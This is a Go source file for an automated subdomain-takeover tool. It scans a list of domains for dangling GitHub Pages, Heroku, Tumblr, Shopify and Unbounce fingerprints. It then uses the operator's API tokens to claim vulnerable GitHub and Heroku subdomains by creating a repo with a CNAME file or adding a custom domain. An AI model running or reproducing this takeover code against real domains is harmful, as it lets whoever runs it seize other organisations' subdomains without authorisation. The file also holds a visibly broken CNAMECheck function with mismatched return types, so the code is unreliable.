package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"regexp"
	"time"

	"github.com/anshumanbh/go-github/github"
	"github.com/bgentry/heroku-go"
	"github.com/subosito/gotenv"
	"golang.org/x/oauth2"
)

func main() {

	gotenv.Load()

	filepath := os.Args[1]

	f, err := os.Open(filepath)

	if err != nil {
		log.Fatalln(err)
	}

	defer f.Close()

	scanner := bufio.NewScanner(f)

	for scanner.Scan() {
		domain := scanner.Text()

		fmt.Println(IsReachable(domain))
	}

}

func IsReachable(domain string) string {
	ch := make(chan string, 1)
	go func() {
		select {
		case ch <- check(domain):
		case <-time.After(5 * time.Second):
			ch <- "timedout"
		}
	}()
	return <-ch
}

func CNAMECheck(domain string) string {
	cname, _ := net.LookupCNAME(domain)
	if !cname {
		return false
	}

	isgithub, _ := regexp.MatchString("github.io", cname)
	isheroku, _ := regexp.MatchString("herokuapp.com", cname)
	istumblr, _ := regexp.MatchString("tumblr.com", cname)
	isshopify, _ := regexp.MatchString("myshopify.com", cname)
	isunbounce, _ := regexp.MatchString("unbouncepages.com", cname)
	isinstapage, _ := regexp.MatchString("pageserve.co", cname)
	isdesk, _ := regexp.MatchString("desk.com", cname)
	istictail, _ := regexp.MatchString("tictail.com", cname)
	iscampaignmonitor, _ := regexp.MatchString("createsend.com", cname)
	iscargocollective, _ := regexp.MatchString("cargocollective.com", cname)
	isstatuspage, _ := regexp.MatchString("statuspage.io", cname)
	isamazonaws, _ := regexp.MatchString("amazonaws.com", cname)
	iscloudfront, _ := regexp.MatchString("cloudfront.net", cname)
	ishubspot, _ := regexp.MatchString("hubspot.net", cname)
	issquarespace, _ := regexp.MatchString("squarespace.com", cname)

	switch {
	case isgithub:
		return true, "github"
	case isheroku:
		return true, "heroku"
	case istumblr:
		return true, "tumblr"
	case isshopify:
		return true, "shopify"
	case isunbounce:
		return true, "unbounce"
	case isinstapage:
		return true, "instapage"
	case isdesk:
		return true, "desk"
	case istictail:
		return true, "tictail"
	case iscampaignmonitor:
		return true, "campaignmonitor"
	case iscargocollective:
		return true, "cargocollective"
	case isstatuspage:
		return true, "statuspage"
	case isamazonaws:
		return true, "amazonaws"
	case iscloudfront:
		return true, "cloudfront"
	case ishubspot:
		return true, "hubspot"
	case issquarespace:
		return true, "squarespace"
	}
	return false, cname
}

func check(domain string) string {
	tr := &http.Transport{
		Dial: (&net.Dialer{
			Timeout: 5 * time.Second,
		}).Dial,
		TLSHandshakeTimeout: 5 * time.Second,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
	}

	timeout := time.Duration(5 * time.Second)
	client := &http.Client{
		Transport: tr,
		Timeout:   timeout,
	}

	istumblr, _ := regexp.MatchString("tumblr", string(domain))

	response, err := client.Get("https://" + domain)
	if err != nil {
		fmt.Println("")
		return "Can't reach the domain " + domain
	}

	// check if its a tumblr blog page since tumblr deals differently with http vs https
	// If its tumblr, send the request over http vs https
	if istumblr {
		response, err = client.Get("http://" + domain)
		if err != nil {
			fmt.Println("")
			return "Can't reach the domain " + domain
		}
	}

	text, err := ioutil.ReadAll(response.Body)
	if err != nil {
		log.Fatal(err)
		return "Trouble reading response"
	}

	cantakeovermatchgithub1, _ := regexp.MatchString("There isn't a GitHub Pages site here.", string(text))
	cantakeovermatchgithub2, _ := regexp.MatchString("For root URLs (like http://example.com/) you must provide an index.html file", string(text))
	cantakeovermatchheroku, _ := regexp.MatchString("Heroku | No such app", string(text))
	cantakeovermatchunbounce, _ := regexp.MatchString("The requested URL / was not found on this server.", string(text))
	cantakeovermatchtumblr, _ := regexp.MatchString("There's nothing here.", string(text))
	cantakeovermatchshopify1, _ := regexp.MatchString("Only one step left!", string(text))
	cantakeovermatchshopify2, _ := regexp.MatchString("Sorry, this shop is currently unavailable.", string(text))

	//TODO: change this to switch statements
	if cantakeovermatchgithub1 {
		fmt.Println("")
		return githubcreate(domain)
	} else if cantakeovermatchgithub2 {
		fmt.Println("")
		return githubcreate(domain)
	} else if cantakeovermatchheroku {
		fmt.Println("")
		return herokucreate(domain)
	} else if cantakeovermatchunbounce {
		fmt.Println("")
		return unbouncecreate(domain)
	} else if cantakeovermatchtumblr {
		fmt.Println("")
		return tumblrcreate(domain)
	} else if cantakeovermatchshopify1 {
		fmt.Println("")
		return shopifycreate(domain)
	} else if cantakeovermatchshopify2 {
		fmt.Println("")
		return shopifycreate(domain)
	} else {
		fmt.Println("")
		return domain + " Not found as dangling for any of the common content hosting websites"
	}
}

func githubcreate(domain string) string {

	fmt.Println("Found: Misconfigured Github Page at " + domain)
	fmt.Println("Trying to take over this domain now..Please wait for a few seconds")

	// Connecting to your Github account using the Personal Access Token
	ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: os.Getenv("token")})
	tc := oauth2.NewClient(oauth2.NoContext, ts)
	client := github.NewClient(tc)

	repo := &github.Repository{
		Name:            github.String(domain),
		Description:     github.String("testing subdomain takeovers"),
		Private:         github.Bool(false),
		LicenseTemplate: github.String("mit"),
	}

	// Creating a repo
	repocreate, _, err := client.Repositories.Create("", repo)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	reponame := *repocreate.Name
	ownername := *repocreate.Owner.Login
	refURL := *repocreate.URL
	ref := "refs/heads/master"

	// Retrieving the SHA value of the head branch
	SHAvalue, _, err := client.Repositories.GetCommitSHA1(ownername, reponame, ref, "")
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	opt := &github.Reference{
		Ref: github.String("refs/heads/gh-pages"),
		URL: github.String(refURL + "/git/refs/heads/gh-pages"),
		Object: &github.GitObject{
			SHA: github.String(SHAvalue),
		},
	}

	// Creating the gh-pages branch using the SHA value obtained above
	newref, _, err := client.Git.CreateRef(ownername, reponame, opt)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	Indexpath := "index.html"
	CNAMEpath := "CNAME"
	data := "This domain is temporarily suspended"

	indexfile := &github.RepositoryContentFileOptions{
		Message: github.String("Adding the index.html page"),
		Content: []byte(data),
		Branch:  github.String("gh-pages"),
	}

	// Creating the index file with the text you want to see when the domain is taken over
	newfile1, _, err := client.Repositories.CreateFile(ownername, reponame, Indexpath, indexfile)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	cnamefile := &github.RepositoryContentFileOptions{
		Message: github.String("Adding the subdomain to takeover to the CNAME file"),
		Content: []byte(domain),
		Branch:  github.String("gh-pages"),
	}

	// Creating the CNAME file with the domain that needs to be taken over
	newfile2, _, err := client.Repositories.CreateFile(ownername, reponame, CNAMEpath, cnamefile)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	fmt.Println("Branch created at " + *newref.URL)
	fmt.Println("Index File created at " + *newfile1.URL)
	fmt.Println("CNAME file created at " + *newfile2.URL)

	return "Please check " + domain + " after a few minutes to ensure that it has been taken over.."

}

func herokucreate(domain string) string {
	fmt.Println("Found: Misconfigured Heroku app at " + domain)
	fmt.Println("Trying to take over this domain now..Please wait for a few seconds")

	// Connecting to your Heroku account using the usernamd and the API key provided in the .env file
	client := heroku.Client{Username: os.Getenv("herokuusername"), Password: os.Getenv("herokuapikey")}

	// Adding the dangling domain as a custom domain for your appname that is retrieved from the .env file
	// This results in the dangling domain pointing to your Heroku appname
	client.DomainCreate(os.Getenv("herokuappname"), domain)

	return "Please check " + domain + " after a few minutes to ensure that it has been taken over.."
}

func unbouncecreate(domain string) string {
	fmt.Println("Found: Misconfigured Unbounce landing page at " + domain)
	return "This can potentially be taken over. Unfortunately, the tool does not support taking over Unbounce pages at the moment."
}

func tumblrcreate(domain string) string {
	fmt.Println("Found: Misconfigured Tumblr Blog at " + domain)
	return "This can potentially be taken over. Unfortunately, the tool does not support taking over Tumblr blogs at the moment."
}

func shopifycreate(domain string) string {
	fmt.Println("Found: Misconfigured Shopify shop at " + domain)
	return "This can potentially be taken over. Unfortunately, the tool does not support taking over Shopify shops at the moment."
	// This can be done 2 ways. If only 1 step left, then maybe just adding the domain to your shop would work
	// If shop currently unavailable at the domain, then maybe creating a shop and then adding that domain should work
}
